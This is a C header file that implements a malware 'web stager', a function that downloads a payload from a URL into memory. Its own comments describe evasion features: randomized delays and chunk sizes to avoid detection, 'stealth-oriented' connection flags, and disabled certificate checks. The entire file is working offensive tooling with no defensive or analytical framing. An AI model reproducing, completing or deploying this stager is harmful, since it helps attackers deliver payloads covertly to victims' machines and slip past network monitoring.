#pragma once
#include <WinInet.h>
#include <ctime>

#pragma comment (lib, "Wininet.lib")

// WebStager function
BOOL WebStager(LPCWSTR szUrl, LPCWSTR szUserAgent, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize) {
    BOOL bSTATE = TRUE;
    HINTERNET hInternet = NULL, hInternetFile = NULL;
    DWORD dwBytesRead = 0;
    SIZE_T sSize = 0, chunkSize = 0;
    PBYTE pBytes = NULL, pTmpBytes = NULL;
    HANDLE hHeap = GetProcessHeap();
    HANDLE hRandomDelay = NULL;

    // Seed random number generator
    srand((unsigned int)time(NULL));

    // Create event for randomized delays to mimic human-like network behavior
    hRandomDelay = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hRandomDelay == NULL) return FALSE;

    // Initial random delay to avoid immediate connection patterns
    WaitForSingleObject(hRandomDelay, rand() % 500);

    // Open internet session with user-specified agent
    hInternet = InternetOpenW(
        szUserAgent,
        NULL,
        NULL,
        NULL,
        NULL
    );
    if (hInternet == NULL) {
        CloseHandle(hRandomDelay);
        return FALSE;
    }

    // Delay before URL connection to simulate network latency
    WaitForSingleObject(hRandomDelay, rand() % 400);

    // Open URL with stealth-oriented connection flags
    hInternetFile = InternetOpenUrlW(
        hInternet,
        szUrl,
        NULL,
        0,
        //INTERNET_FLAG_SECURE |
        INTERNET_FLAG_EXISTING_CONNECT |
        INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
        INTERNET_FLAG_NO_CACHE_WRITE |
        INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
        INTERNET_FLAG_HYPERLINK, // | INTERNET_FLAG_KEEP_CONNECTION??
        0
    );
    if (hInternetFile == NULL) {
        InternetCloseHandle(hInternet);
        CloseHandle(hRandomDelay);
        return FALSE;
    }

    // Pause before buffer allocation to reduce predictability
    WaitForSingleObject(hRandomDelay, rand() % 300);

    // Allocate temporary buffer for chunk reading
    pTmpBytes = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, 1024);
    if (pTmpBytes == NULL) {
        InternetCloseHandle(hInternet);
        InternetCloseHandle(hInternetFile);
        CloseHandle(hRandomDelay);
        return FALSE;
    }

    // Short delay before reading to further obfuscate network pattern
    WaitForSingleObject(hRandomDelay, rand() % 100);

    while (TRUE) {
        // Randomize chunk size to avoid fixed-size transfer detection
        chunkSize = 512 + (rand() % 1024);

        // Read file in variable-sized chunks
        if (!InternetReadFile(hInternetFile, pTmpBytes, chunkSize, &dwBytesRead))
            break;

        // Random inter-chunk delay to simulate inconsistent network conditions
        WaitForSingleObject(hRandomDelay, rand() % 100);

        sSize += dwBytesRead;

        // Dynamically allocate and resize payload buffer
        if (pBytes == NULL)
            pBytes = (PBYTE)HeapAlloc(hHeap, HEAP_ZERO_MEMORY, dwBytesRead);
        else
            pBytes = (PBYTE)HeapReAlloc(hHeap, HEAP_ZERO_MEMORY, pBytes, sSize);

        if (pBytes == NULL)
            break;

        // Copy chunk to payload buffer
        memcpy((PVOID)(pBytes + (sSize - dwBytesRead)), pTmpBytes, dwBytesRead);
        SecureZeroMemory(pTmpBytes, dwBytesRead);

        // Stop reading if last chunk is smaller than expected
        if (dwBytesRead < chunkSize)
            break;
    }

    // Final delay before returning payload to randomize exit timing
    WaitForSingleObject(hRandomDelay, rand() % 200);

    // Return payload details
    *pPayloadBytes = pBytes;
    *sPayloadSize = sSize;

    // Cleanup resources
    InternetCloseHandle(hInternet);
    InternetCloseHandle(hInternetFile);
    HeapFree(hHeap, 0, pTmpBytes);
    CloseHandle(hRandomDelay);

    return (pBytes != NULL);
}
